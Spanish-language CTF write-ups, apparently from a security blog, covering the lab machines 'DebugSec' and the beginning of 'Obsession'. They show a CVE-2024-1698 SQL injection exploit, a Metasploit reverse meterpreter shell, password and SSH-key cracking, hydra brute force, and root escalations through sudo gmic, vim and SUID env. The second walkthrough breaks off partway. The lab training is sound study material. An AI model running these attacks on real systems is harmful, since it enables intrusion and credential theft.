<p>Estamos ante una máquina Linux de nivel avanzado creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
10.0.2.144      08:00:27:64:b7:09       <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.144</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.144</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.144
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.144
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 14:f7:d8:c3:33:07:81:51:da:fa:bf:4c:03:51:2a:94 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4d:2a:b5:82:f5:f0:88:3d:75:9d:f3:fe:27:30:a6:f8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.59 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: Did not follow redirect to http://debugsec.thl/
|_http-server-header: Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
</code></pre></div></div>

<p>Añadimos al fichero hosts el dominio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.0.2.144 debugsec.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<p>Vemos que hay en la web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://debugsec.thl
http://debugsec.thl <span class="o">[</span>200 OK] Apache[2.4.59], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.144], MetaGenerator[WordPress 6.3.4], PoweredBy[--], Script, Title[DebugSec &amp;#8211<span class="p">;</span> sssssssss], UncommonHeaders[link], WordPress[6.3.4]        
</code></pre></div></div>

<p>Como vemos tenemos un wordpress corriendo en el servidor. Ejecutamos <code class="language-plaintext highlighter-rouge">wpscan</code> para obtener información valiosa. Usamos <code class="language-plaintext highlighter-rouge">-e u,vp</code> para enumerar usuarios y plugins vulnerables:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://debugsec.thl <span class="nt">-e</span> u,vp
<span class="o">[</span>+] notificationx
 | Location: http://debugsec.thl/wp-content/plugins/notificationx/
 | Last Updated: 2024-06-13T07:29:00.000Z
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 2.8.9
 |
 | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By: Urls In 404 Page <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | <span class="o">[!]</span> 1 vulnerability identified:
 |
 | <span class="o">[!]</span> Title: NotificationX – Best FOMO, Social Proof, WooCommerce Sales Popup &amp; Notification Bar Plugin With Elementor &lt; 2.8.3 - Unauthenticated SQL Injection
 |     Fixed <span class="k">in</span>: 2.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/3a66cb18-dfba-4b6b-bde0-d0efe2853326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2024-1698
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e110ea99-e2fa-4558-bcf3-942a35af0b91
 |
 | Version: 2.8.2 <span class="o">(</span>100% confidence<span class="o">)</span>

</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vemos que hay una vulnerabilidad en el plugin <code class="language-plaintext highlighter-rouge">NotificationX</code> y tiene asignado un cve <strong>CVE-2024-1698.</strong> Buscamos información sobre la vulnerabilidad y encontramos un exploit escrito en python, lo descargamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/kamranhasan/CVE-2024-1698-Exploit/main/exploit.py
</code></pre></div></div>

<p>Modificamos la url para que sea nuestro servidor victima y modificamos el delay para que sea 1 segundo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delay <span class="o">=</span> 1

url <span class="o">=</span> <span class="s2">"http://debugsec.thl/wp-json/notificationx/v1/analytics"</span>

</code></pre></div></div>

<p>Al terminar nos da que el usuario administrador es <strong>wordpress</strong> y su hash. Lo añadiremos a un fichero llamado hash para después intentar crackearlo con la herramienta <code class="language-plaintext highlighter-rouge">hashcat</code>. Usamos <code class="language-plaintext highlighter-rouge">-a 0</code> para que sea un ataque usando un diccionario y <code class="language-plaintext highlighter-rouge">-m 400</code> porque se trata de un hash en formato <strong>Wordpress(MD5)</strong> . Le indicamos el hash a romper y el diccionario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx/'</span> <span class="o">&gt;</span> <span class="nb">hash

</span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt

<span class="nv">$P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx</span>/:mcartney
</code></pre></div></div>

<p>Obtenemos las credenciales de administrador del sitio. Ahora tenemos que conseguir una shell reversa. Para ello he usado un exploit de  <code class="language-plaintext highlighter-rouge">metasploit</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole

msf6 <span class="o">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="o">)</span>:

   Name       Current Settin  Required  Description
              g
   <span class="nt">----</span>       <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   PASSWORD                   <span class="nb">yes       </span>The WordPress passwor
                                        d to authenticate wit
                                        h
   Proxies                    no        A proxy chain of form
                                        at <span class="nb">type</span>:host:port[,ty
                                        pe:host:port][...]
   RHOSTS                     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, s
                                        ee https://docs.metas
                                        ploit.com/docs/using-
                                        metasploit/basics/usi
                                        ng-metasploit.html
   RPORT      80              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL        <span class="nb">false           </span>no        Negotiate SSL/TLS <span class="k">for
                                         </span>outgoing connections
   TARGETURI  /               <span class="nb">yes       </span>The base path to the
                                        wordpress application
   USERNAME                   <span class="nb">yes       </span>The WordPress usernam
                                        e to authenticate wit
                                        h
   VHOST                      no        HTTP server virtual h
                                        ost

Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
                                     nterface may be specifie
                                     d<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   WordPress

View the full module info with the info, or info <span class="nt">-d</span> command.

msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost eth1
lhost <span class="o">=&gt;</span> 10.0.2.5
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost http://debugsec.thl
rhost <span class="o">=&gt;</span> http://debugsec.thl
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>user
<span class="nb">set </span>useragent  <span class="nb">set </span>username   
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username wordpress
username <span class="o">=&gt;</span> wordpress
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password mcartney
password <span class="o">=&gt;</span> mcartney
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> check
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.0.2.144:80 - The target appears to be vulnerable.
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.0.2.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using wordpress:mcartney...
<span class="o">[</span>+] Authenticated with WordPress
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wp-content/plugins/mrSdippeTD/xbUJBJxMvl.php...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39927 bytes<span class="o">)</span> to 10.0.2.144
<span class="o">[</span>+] Deleted xbUJBJxMvl.php
<span class="o">[</span>+] Deleted mrSdippeTD.php
<span class="o">[</span>+] Deleted ../mrSdippeTD
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.0.2.5:4444 -&gt; 10.0.2.144:41196<span class="o">)</span> at 2024-06-30 00:02:07 +0200

meterpreter <span class="o">&gt;</span> 
</code></pre></div></div>

<p>Obtenemos una sesion de meterpreter.  Ahora buscando por el servidor encontramos una clave privada en el directorio<code class="language-plaintext highlighter-rouge">/opt</code>. Nos la descargamos a nuestro equipo y vemos que usuarios hay en el sistema leyendo el fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
meterpreter <span class="o">&gt;</span> <span class="nb">cd</span> /opt
meterpreter <span class="o">&gt;</span> <span class="nb">ls
</span>Listing: /opt
<span class="o">=============</span>

Mode              Size  Type  Last modified            Name
<span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">----</span>  <span class="nt">-------------</span>            <span class="nt">----</span>
100755/rwxr-xr-x  3434  fil   2024-06-28 18:52:01 +02  id_rsa

meterpreter <span class="o">&gt;</span> download id_rsa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading: id_rsa -&gt; /home/murrusko/id_rsa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloaded 3.35 KiB of 3.35 KiB <span class="o">(</span>100.0%<span class="o">)</span>: id_rsa -&gt; /home/murrusko/id_rsa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : id_rsa -&gt; /home/murrusko/id_rsa 

meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> /etc/passwd
debugsec:x:1001:1001::/home/debugsec:/bin/bash
                       
</code></pre></div></div>

<p>Ya tenemos un supuesto usuario con su clave privada. Le cambiamos el permiso a la clave privada h probamos a conectarnos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa debugsec@10.0.2.144
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
</code></pre></div></div>

<p>Nos pide una clave. Intentamos romperla con john.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh2john id_rsa <span class="o">&gt;</span> ssh_hash
<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt ssh_hash
pangga           <span class="o">(</span>id_rsa<span class="o">)</span>
</code></pre></div></div>

<p>Una vez obtenida la contraseña nos conectamos al sistema y obtenemos la flag de user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa debugsec@10.0.2.144
Last login: Fri Jun 28 18:57:57 2024 from 192.168.18.19
debugsec@debugsec:~<span class="err">$</span>
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Miramos si puede ejecutar algo como usuario root con <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugsec@debugsec:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>debugsec on debugsec:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User debugsec may run the following commands on debugsec:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/gmic
</code></pre></div></div>

<p>Buscamos la ayuda de gmic y vemos que hay una opción de ejecutar comandos del sistema. Ejecutamos como sudo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugsec@debugsec:~<span class="nv">$ </span><span class="nb">sudo </span>gmic <span class="nb">exec </span>bash
<span class="o">[</span>gmic]-0./ Start G<span class="s1">'MIC interpreter.
[gmic]-0./ Execute external command '</span>bash<span class="s1">' in verbose mode.
root@debugsec:/home/debugsec# whoami
root
</span></code></pre></div></div>

<p>Y con esto ya tendriamos rooteada la máquina.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="avanzado" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Obsession</title><link href="/posts/obsession/" rel="alternate" type="text/html" title="Obsession" /><published>2024-06-26T00:00:00+00:00</published><updated>2024-06-26T00:00:00+00:00</updated><id>/posts/obsession</id><content type="html" xml:base="/posts/obsession/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel muy facil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Vemos que tiene los puertos 21, 22 y 80 abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| <span class="nt">-rw-r--r--</span>    1 0        0             667 Jun 18 03:20 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Russoski Coaching
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos se puede acceder al ftp de forma anónima con las credenciales de <code class="language-plaintext highlighter-rouge">ftp:ftp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp ftp@172.17.0.2
Connected to 172.17.0.2.
220 <span class="o">(</span>vsFTPd 3.0.5<span class="o">)</span>
331 Please specify the password.
Password: 
230 Login successful.
</code></pre></div></div>

<p>Nos descargamos todos los ficheros con <code class="language-plaintext highlighter-rouge">mget *</code> y respondemos <code class="language-plaintext highlighter-rouge">a</code> para que se descargue todos sin volver a preguntar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; mget <span class="k">*</span>
mget chat-gonza.txt <span class="o">[</span>anpqy?]? a
Prompting off <span class="k">for </span>duration of mget.
229 Entering Extended Passive Mode <span class="o">(||</span>|17408|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>chat-gonza.txt <span class="o">(</span>667 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************</span>|   667       13.82 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received <span class="k">in </span>00:00 <span class="o">(</span>673.59 KiB/s<span class="o">)</span>
229 Entering Extended Passive Mode <span class="o">(||</span>|32406|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>pendientes.txt <span class="o">(</span>315 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************</span>|   315        5.36 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received <span class="k">in </span>00:00 <span class="o">(</span>466.08 KiB/s<span class="o">)</span>
ftp&gt;
</code></pre></div></div>

<p>Leemos el fichero <code class="language-plaintext highlighter-rouge">chat-gonza.txt</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>chat-gonza.txt 
<span class="o">[</span>16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
<span class="o">[</span>16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
<span class="o">[</span>16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
<span class="o">[</span>21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
<span class="o">[</span>21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
<span class="o">[</span>22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
</code></pre></div></div>

<p>Como hace mención a una URL realizamos una búsqueda de directorios y ficheros en el servidor. Para ello, usamos la herramienta <code class="language-plaintext highlighter-rouge">feroxbuster</code>. Como parámetros le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda y con <code class="language-plaintext highlighter-rouge">-r</code> que si hay alguna redireccion que la siga.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-r</span>
200      GET      158l      358w     3292c http://172.17.0.2/style.css
200      GET       16l       51w      731c http://172.17.0.2/.formrellyrespexit.html
200      GET      118l      384w     5208c http://172.17.0.2/
200      GET        1l        8w       61c http://172.17.0.2/backup/backup.txt
200      GET       16l       60w      937c http://172.17.0.2/backup/
200      GET       37l      287w     2417c http://172.17.0.2/important/important.md
200      GET       16l       58w      947c http://172.17.0.2/important/
</code></pre></div></div>

<p>Encontramos varios ficheros entre ellos <code class="language-plaintext highlighter-rouge">/backup/backup.txt</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/backup/backup.txt        
Usuario para todos mis servicios: russoski <span class="o">(</span>cambiar pronto!<span class="o">)</span>
</code></pre></div></div>

<p>Con esto ya tenemos un usuario del sistema <strong>russoski</strong>.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Vamos a probar si el usuario <strong>russoski</strong> tiene una password que este en el famoso diccionario <em>rockyou.txt</em>. Usaremos la herramienta hydra para realizar un ataque de fuerza bruta al servicio <code class="language-plaintext highlighter-rouge">ssh</code>. Le indicamos con <code class="language-plaintext highlighter-rouge">-l</code> el nombre de usuario, con la<code class="language-plaintext highlighter-rouge">-P</code> el diccionario <em>rockyou.txt</em> con las psswords, con los parámetros <code class="language-plaintext highlighter-rouge">-V -I -f</code> le indicamos que nos muestre por pantalla el detalle de la prueba, que empiece de 0 aunque encuentre un fichero de restauración y que si encuentra una password que se detenga.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> russoski <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-V</span> <span class="nt">-I</span> <span class="nt">-f</span> ssh://172.17.0.2
...
<span class="o">[</span>22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
</code></pre></div></div>

<p>Encontramos un password válida para <strong>russoski</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh russoski@172.17.0.2
russoski@172.17.0.2<span class="s1">'s password:
russoski@28c41160317a:~$
</span></code></pre></div></div>

<p>Hacemos un listado completo del home del usuario con <code class="language-plaintext highlighter-rouge">ls -la</code> y vemos que el fichero <code class="language-plaintext highlighter-rouge">.bash_history</code> no está vacio ni esta redirigido a <code class="language-plaintext highlighter-rouge">/dev/null</code>. Lo leemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
<span class="nb">ls
pwd
exit
ls
pwd
exit
</span>su root
<span class="nb">sudo</span> <span class="nt">-l</span>
clear
su root
<span class="nb">cd</span> /var/www/html
<span class="nb">ls
ls</span> <span class="nt">-la</span>
<span class="nb">cat</span> .formrellyrespexit.html 
clear
<span class="nb">ls
cd </span>backup/
<span class="nb">cd</span> ..
<span class="nb">cd </span>important/
<span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">cat</span> .root-passwd.txt 
clear
<span class="nb">cd</span> /home/russoski/
<span class="nb">ls
cd </span>Proyectos/
<span class="nb">ls
cd</span> ..
<span class="nb">cd </span>Documentos/
<span class="nb">ls
</span>la <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
clear
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">chmod </span>u+s /usr/bin/env
<span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
clear
<span class="nb">ls
cd</span> ..
<span class="nb">ls
</span>clear
<span class="nb">ls
exit
</span>clear
<span class="nb">ls
</span>su root
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/env /bin/sh <span class="nt">-p</span>
clear
<span class="nb">cd</span> /root
<span class="nb">exit
sudo</span> <span class="nt">-l</span>
<span class="nb">exit</span>

</code></pre></div></div>

<p>Viendo detalladamente el fichero se aprecian 3 posibles formas que se han usado para escalar privilegios.</p>

<h1 id="escalada-de-privilegios-1">Escalada de privilegios 1</h1>

<p>Nos movemos al directorio <code class="language-plaintext highlighter-rouge">cd /var/www/html/important</code> y leemos el fichero <code class="language-plaintext highlighter-rouge">.root-passwd.txt</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:/var/www/html/important/<span class="nv">$ </span><span class="nb">cat</span> .root-passwd.txt 

Anuar brother, por aquí te dejo la clave de root como dijimos, arréglame eso en cuanto puedas y ya sabes borra este archivo
apenas ya no lo necesites, que yo lo tengo guardado en KeePassXC, ah y que nadie excepto tú entre a la carpeta <span class="s2">"/root"</span><span class="o">!</span>

aac0a9daa4185875786c9ed154f0dece <span class="o">(</span>te lo he hasheado por si las moscas<span class="o">)</span>
</code></pre></div></div>

<p>Copiamos el hash y creamos un fichero con el nombre <strong>hash</strong>. Después usando la herramienta <code class="language-plaintext highlighter-rouge">john</code> intentamos desencriptar el hash. Le indicamos que se trata de un hash en <strong>MD5</strong> con <code class="language-plaintext highlighter-rouge">--format=Raw-MD5</code>, el diccionario de passwords con <code class="language-plaintext highlighter-rouge">—-wordlist=</code> y finalmente el fichero que contiene el hash:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"aac0a9daa4185875786c9ed154f0dece"</span> <span class="o">&gt;</span> <span class="nb">hash</span>

<span class="nv">$ </span>john <span class="nt">--format</span><span class="o">=</span>Raw-MD5  <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
fucker           <span class="o">(</span>?<span class="o">)</span>
</code></pre></div></div>

<p>Obtenemos una clave y la probamos con <code class="language-plaintext highlighter-rouge">su root</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>su root
Password:
root@28c41160317a:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

